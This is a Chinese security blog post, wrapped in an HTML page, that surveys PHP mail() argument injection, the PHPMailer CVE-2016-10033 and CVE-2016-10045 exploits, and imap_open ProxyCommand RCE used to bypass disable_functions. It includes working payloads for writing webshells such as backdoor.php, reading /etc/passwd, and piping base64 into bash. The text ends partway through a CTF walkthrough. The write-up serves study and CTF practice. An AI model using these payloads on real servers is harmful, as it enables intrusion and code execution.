@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离怀秋" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="本文首发于安恒讲武堂。 PHP mail()函数介绍 PHP mail()函数利用姿势PHP中，mail的函数在底层是写好的，调用linux的sendmail程序来发送邮件，在额外参数中，sendmail还支持其他三个选项。 -X logfile ：指定一个文件来记录邮件发送的详细日志。 -C file：临时加载一个配置文件(可以读文件)。 -O option&#x3D;value ：临时设置一个邮件储存的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP邮件漏洞小结">
+<meta property="og:url" content="http://yoursite.com/2019/06/01/PHP%E9%82%AE%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/index.html">
+<meta property="og:site_name" content="离怀秋">
+<meta property="og:description" content="本文首发于安恒讲武堂。 PHP mail()函数介绍 PHP mail()函数利用姿势PHP中，mail的函数在底层是写好的，调用linux的sendmail程序来发送邮件，在额外参数中，sendmail还支持其他三个选项。 -X logfile ：指定一个文件来记录邮件发送的详细日志。 -C file：临时加载一个配置文件(可以读文件)。 -O option&#x3D;value ：临时设置一个邮件储存的">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/tryesk5twn.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/o8zseonz16.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/1qqr8072a8.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/cucu3a9o0r.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/c97ghqguqh.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/ih4s6yn97f.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/ev2zm10o5c.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/r78d9ge9wi.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/une987b3fb.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/7qbsn6y04g.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/c2js2jmmdq.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/qr993d2moo.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/p2zj9db29o.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/83zujvj2rn.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/myicbnpswj.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/i2fhoomnie.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/87fuqh61re.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/9md0tflbky.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/nb9t3kbucc.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/39443ngokr.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/5426480/vcfnmspuo2.jpeg?imageView2/2/w/1620">
+<meta property="article:published_time" content="2019-06-01T08:58:07.000Z">
+<meta property="article:modified_time" content="2019-07-25T08:45:42.000Z">
+<meta property="article:author" content="离怀秋">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ask.qcloudimg.com/http-save/5426480/tryesk5twn.jpeg?imageView2/2/w/1620">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/06/01/PHP邮件漏洞小结/"/>
+
+
+
+
+
+  <title>PHP邮件漏洞小结 | 离怀秋</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/lihuaiqiu" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离怀秋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">穷且益坚，不负青云之志</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/01/PHP%E9%82%AE%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离怀秋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离怀秋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHP邮件漏洞小结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-01T16:58:07+08:00">
+                2019-06-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>本文首发于安恒讲武堂。</p>
+<h2 id="PHP-mail-函数介绍"><a href="#PHP-mail-函数介绍" class="headerlink" title="PHP mail()函数介绍"></a><strong>PHP mail()函数介绍</strong></h2><p><img src="https://ask.qcloudimg.com/http-save/5426480/tryesk5twn.jpeg?imageView2/2/w/1620" alt="img"></p>
+<h2 id="PHP-mail-函数利用姿势"><a href="#PHP-mail-函数利用姿势" class="headerlink" title="PHP mail()函数利用姿势"></a><strong>PHP mail()函数利用姿势</strong></h2><p>PHP中，mail的函数在底层是写好的，调用linux的sendmail程序来发送邮件，在额外参数中，sendmail还支持其他三个选项。</p>
+<p>-X logfile ：指定一个文件来记录邮件发送的详细日志。</p>
+<p>-C file：临时加载一个配置文件(<strong>可以读文件</strong>)。</p>
+<p>-O option=value ：临时设置一个邮件储存的临时位置。</p>
+<p><strong>任意文件写入</strong></p>
+<p>代码如下:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$to = <span class="string">'a@b.c'</span>;$subject = <span class="string">'&lt;?php system("whoami"); ?&gt;'</span>;$message = <span class="string">'&lt;?php system("ls");?&gt;'</span>;$headers = <span class="string">''</span>;$options = <span class="string">'-f lihuaiqiu@1 -OQueueDirectory=/tmp/ -X/root/1.php'</span>;mail($to, $subject, $message, $headers, $options);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>实际运行命令为： <code>/usr/bin/sendmail-t-i-f lihuaiqiu@1-OQueueDirectory=/tmp/-X/root/1.php</code></p>
+<p>此命令简写形式 <code>-f lihuaiqiu@1-oQ/tmp/-X/root/1.php</code>可突破某些字符限制的地方。</p>
+<p>查看并运行邮件日志1.php回显:</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/o8zseonz16.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>成功将邮件内容写入日志,并进行了命令执行。</p>
+<p><strong>任意文件读取</strong></p>
+<p>代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$to = <span class="string">'a@b.c'</span>;$subject = <span class="string">'&lt;?php system("whoami"); ?&gt;'</span>;$message = <span class="string">'&lt;?php system("ls");?&gt;'</span>;$headers = <span class="string">''</span>;$options = <span class="string">'-f lihuaiqiu@1 -C/etc/passwd -X/root/1.php'</span>;mail($to, $subject, $message, $headers, $options);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>实际运行命令: <code>/usr/bin/sendmail-t-i-f lihuaiqiu@1-C/etc/passwd-X/root/1.php</code></p>
+<p>回显效果：</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/1qqr8072a8.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>成功读取敏感数据文件。</p>
+<p><strong>利用配置文件执行代码</strong></p>
+<p>上述两种情况只建立在我们的目录有写权限以及写入的文件可以执行条件下，但是如果我们面临着没有写权限或者无法执行写入文件该怎么办呢，这时就要用到新的姿势，利用配置文件执行代码。</p>
+<p>找到一个上传点，上传一个静态文件，文件内容为sendmail的配置文件内容并在末尾加上如下代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mlocal,              P=<span class="regexp">/usr/</span>bin/php, F=lsDFMAw5:<span class="regexp">/|@qPn9S, S=EnvFromL/</span>HdrFromL,</span><br><span class="line">R=EnvToL/HdrToL,</span><br><span class="line">T=DNS/RFC822/X-Unix,</span><br><span class="line">A=php -- $u $h $&#123;client_addr&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>原理:系统默认使用sendmail-mta来解析邮件的内容，这里添加的内容目的是覆盖默认的解析，使用PHP来解析邮件内容。</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload为 lihuaiqiu@<span class="number">1</span> -oQ/tmp -X ./upload/sendmail_cf</span><br></pre></td></tr></table></figure>
+
+<p>实际执行的命令： <code>/usr/bin/sendmail-t-i-f lihuaiqiu@1-oQ/tmp-X./upload/sendmail_cf</code></p>
+<p><strong>将邮件内容以php方式进行解析进行命令执行。</strong></p>
+<h2 id="CVE-2016-10033分析"><a href="#CVE-2016-10033分析" class="headerlink" title="CVE-2016-10033分析"></a>CVE-2016-10033分析</h2><p>上面我们分析了PHP中mail函数产生的漏洞,而这个cve phpmailer正是因为第五个参数过滤的不严谨导致的漏洞,下面开始进行分析，代码在<a href="https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php" target="_blank" rel="noopener">https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php</a></p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/cucu3a9o0r.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>首先定位找到mail函数,需要满足三个条件，才可以进行五个参数的mail函数执行,需满足：<strong>没有开启safe_mode模式以及$params非Null</strong>。</p>
+<p>然后在接下来的代码寻找$params这个值是怎么来的</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/c97ghqguqh.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>很明显可以看到$params来自于$this-&gt;Sender，并且在下面的执行语句中，$params变量会传递进mailPassthru函数中进而给mail函数当作第五个参数。</p>
+<p>接着跟进$this-&gt;sender</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/ih4s6yn97f.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>可以从函数中看出来，<strong>$address经过strpos函数以及validataAddress的检测，最终把值赋给$this-&gt;sender</strong>。</p>
+<p>跟进validataAddress函数</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/ev2zm10o5c.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>可以看到依然用了strpos进行了一次检测，接着向下走会看到如果<strong>PHP_VERSION&lt;5.2的话</strong>，则选择noregex模式对$address进行检测</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/r78d9ge9wi.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>这是一个很鸡肋的检测，基本上payload中含有@就可以的。</p>
+<p>最终构造exp: <code>lihuaiqiu@1-oQ/tmp-X/var/www/backdoor.php</code>，最终将日志文件写入backdoor.php中。</p>
+<p>漏洞环境<a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="noopener">https://github.com/opsxcq/exploit-CVE-2016-10033</a></p>
+<p>漏洞利用条件</p>
+<p><strong>php version &lt; 5.2.0</strong> <strong>no pcre</strong> <strong>phpmailer &lt; 5.2.18</strong> <strong>php safe_mode = false</strong></p>
+<p>exp回显截图</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/une987b3fb.jpeg?imageView2/2/w/1620" alt="img"></p>
+<h2 id="Bypass-pcre8"><a href="#Bypass-pcre8" class="headerlink" title="Bypass pcre8"></a>Bypass pcre8</h2><p><img src="https://ask.qcloudimg.com/http-save/5426480/7qbsn6y04g.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>如果能bypass掉这个恶心的正则，那么利用条件就方便了很多，可以发现在@前面加括号就会可以进行bypass payload为 <code>a(-X/home/www/backdoor.php-OQueueDirectory=/tmp)@qq.com</code></p>
+<h4 id="CVE-2016-10045分析"><a href="#CVE-2016-10045分析" class="headerlink" title="CVE-2016-10045分析"></a>CVE-2016-10045分析</h4><p><img src="https://ask.qcloudimg.com/http-save/5426480/c2js2jmmdq.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>主要更新点在于对于$this-&gt;Sender的函数过滤问题，下面来看一下这个函数的具体情况</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/qr993d2moo.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>其作用我放张图基本就会懂的</p>
+<p>对于代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$str=<span class="string">"a'( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com"</span>;$c=escapeshellarg($str);echo $c;echo <span class="string">"&lt;/br&gt;"</span>;$str=<span class="string">"a( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com"</span>;$b=escapeshellarg($str);echo $b;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果为</p>
+<p>‘a’&#39;‘( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com’</p>
+<p>‘a( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com’</p>
+<p>可以看到此函数将传入的单引号进行了一次转义，并且自己为其他两端字符串添加了单引号，保证两端字符串正确解析.</p>
+<p><strong>但是此时出现了问题,mail函数自带escapeshellcmd函数过滤</strong></p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/p2zj9db29o.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>对于这个函数，我们的上一个payload就会失效的 <code>a(-X/home/www/backdoor.php-OQueueDirectory=/tmp)@qq.com</code>，原因在于<strong>()</strong>被转义。</p>
+<h2 id="escapeshellcmd与escapeshellarg导致参数注入"><a href="#escapeshellcmd与escapeshellarg导致参数注入" class="headerlink" title="escapeshellcmd与escapeshellarg导致参数注入"></a>escapeshellcmd与escapeshellarg导致参数注入</h2><p>当$this-&gt;sender同时被这两个参数处理的话，就会导致单引号逃逸，如下代码测试</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$str=<span class="string">"a'( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com"</span>;$c=escapeshellarg($str);echo $c;</span><br><span class="line">echo escapeshellcmd($c);</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p>‘a’&#39;‘( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com’</p>
+<p>‘a’&#39;‘( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com&#39;</p>
+<p>最终sendmail形式为 <code>-fa\(</code> , <code>-X/home/www/backdoor.php</code> , <code>-OQueueDirectory=/tmp</code> , <code>)@qq.com&#39;</code></p>
+<p>本地测试代码:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$to = <span class="string">'a@b.c'</span>;$subject = <span class="string">'&lt;?php system("whoami"); ?&gt;'</span>;$message = <span class="string">'&lt;?php system("ls");?&gt;'</span>;$headers = <span class="string">''</span>;$options = <span class="string">"'-fa'\\''\( -OQueueDirectory=/tmp -X/root/lihuaiqiu.php \)@a.com\'"</span>;</span><br><span class="line">mail($to, $subject, $message, $headers, $options);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/83zujvj2rn.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>测试结果：</p>
+<p>运行的时候会有一些报错的，但是仍然可以写入文件。</p>
+<h2 id="imap-open-RCE-分析"><a href="#imap-open-RCE-分析" class="headerlink" title="imap_open RCE 分析"></a><strong>imap_open RCE 分析</strong></h2><p>imapopen为介绍的第二种漏洞，imapopen同样也常用于在php中<strong>bypass disable_functions</strong>。</p>
+<h3 id="IMAP介绍"><a href="#IMAP介绍" class="headerlink" title="IMAP介绍"></a><strong>IMAP介绍</strong></h3><p>Internet消息访问协议(IMAP)是电子邮件客户端用于通过TCP/IP连接从邮件服务器检索电子邮件的Internet标准协议，IMAP服务器通常侦听端口号143，在php函数中，imap_open正用于打开邮箱的IMAP流。</p>
+<p>函数介绍如下：</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/myicbnpswj.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>mailbox参数详解：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;[host]&#125;:[port][flags]&#125;[mailbox_name]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>host：标准主机(服务器的域名或者IP地址)</li>
+<li>port：主机端口</li>
+<li>flags：可选标志</li>
+<li>mailbox_name：远程邮箱名称，默认为INBOX</li>
+</ul>
+<p>flags可选标志列表如下： </p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/i2fhoomnie.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>具体链接：<a href="https://www.php.net/manual/zh/function.imap-open.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.imap-open.php</a></p>
+<h3 id="漏洞主要触发原理"><a href="#漏洞主要触发原理" class="headerlink" title="漏洞主要触发原理:"></a>漏洞主要触发原理:</h3><p>如下实例：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@imap_open（<span class="string">'&#123;localhost&#125;：143 / imap&#125; INBOX'</span>，<span class="string">''</span>，<span class="string">''</span>）;</span><br></pre></td></tr></table></figure>
+
+<p>分析：localhost为我们执行命令的参数之一，所以我们可以操纵服务器参数来构造恶意IMAP服务器来执行我们想要的命令，<strong>原理为：在php.ini中imap.enableinsecurersh参数为On的情况下</strong>,<strong>执行imap_open函数时/usr/bin/rsh被链接到ssh指令，所以通过ssh的-o选项我们可以进行命令执行</strong>。这里我们可以看一下ssh中可以执行命令的参数：</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/87fuqh61re.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>通过这个参数，我们就可以执行我们想要的命令了。</p>
+<p>例如官方exp中给出的命令</p>
+<p>ssh -oProxyCommand =”echo hello | tee / tmp / executed”localhost</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/9md0tflbky.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>通过我做的两个实验的例子，可以很清晰的看出构造出来的恶意邮箱服务器参数所造成的危害。</p>
+<p>但是在PHP中填写邮箱参数的时候却不能这么直白的将此恶意邮箱参数填写</p>
+<p><strong>因为在解析的时候，PHP会将空格解释为分隔符以及斜杠作为标志，这里空格还是比较好绕过的，利用$IFS shell变量以及\t都可以进行替换空格，绕过斜杠的方法则是用base64进行编码。</strong></p>
+<p>如：echo bHM=|base64 -d|bash等于与ls。</p>
+<h3 id="docker中模拟测试"><a href="#docker中模拟测试" class="headerlink" title="docker中模拟测试"></a>docker中模拟测试</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull fedosov/docker-php-imap-composer</span><br><span class="line">docker run -i -t -d fedosov/docker-php-imap-composer /bin/bash</span><br><span class="line">docker exec -it <span class="number">9017603</span>a0e13 /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>模拟一个imap的邮件发送脚本，脚本代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$payload = <span class="string">"echo lihuaiqiu|tee /tmp/success"</span>;$encoded_payload = base64_encode($payload);$server = <span class="string">"any -o ProxyCommand=echo\t"</span>.$encoded_payload.<span class="string">"|base64\t-d|bash"</span>;@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure>
+
+<p>运行回显如下：</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/nb9t3kbucc.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>我们通过构造恶意服务器参数，成功的建立了我们想要的文件，通过此功能我们可以写webshell达到我们想要目的。</p>
+<h3 id="Bypass-disable-functions"><a href="#Bypass-disable-functions" class="headerlink" title="Bypass disable_functions"></a><strong>Bypass disable_functions</strong></h3><p>理解了这个漏洞的原理，我们就能知道这个功能是可以bypass disable_functions的。</p>
+<p>下面来具体分析一下：</p>
+<p>在存在RFI或LFI的情况下：</p>
+<p>我们通过imap_open建立一个内容为\的1.php</p>
+<p>运行脚本如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$server = <span class="string">"any -o ProxyCommand=echo\t'\&lt;?php\tsystem(whoami);?&gt;'\t&gt;\t1.php"</span>;@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure>
+
+<p>存在RFI漏洞文件：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以控制$file参数为我们刚才设置的1.php</p>
+<p>回显结果：</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/39443ngokr.jpeg?imageView2/2/w/1620" alt="img"></p>
+<h3 id="安恒二月赛场景分析"><a href="#安恒二月赛场景分析" class="headerlink" title="安恒二月赛场景分析"></a><strong>安恒二月赛场景分析</strong></h3><p>由于没有环境，只能分析一下关键部分的思路</p>
+<p>本题同样为imap_open所产生的漏洞.关键部分的在于对base64以及|的过滤，但是这个是存在上传图片的地方，所以我们可以通过bash+图片名来执行我们想要的命令</p>
+<p>本地代码复现:</p>
+<p>运行脚本如下：</p>
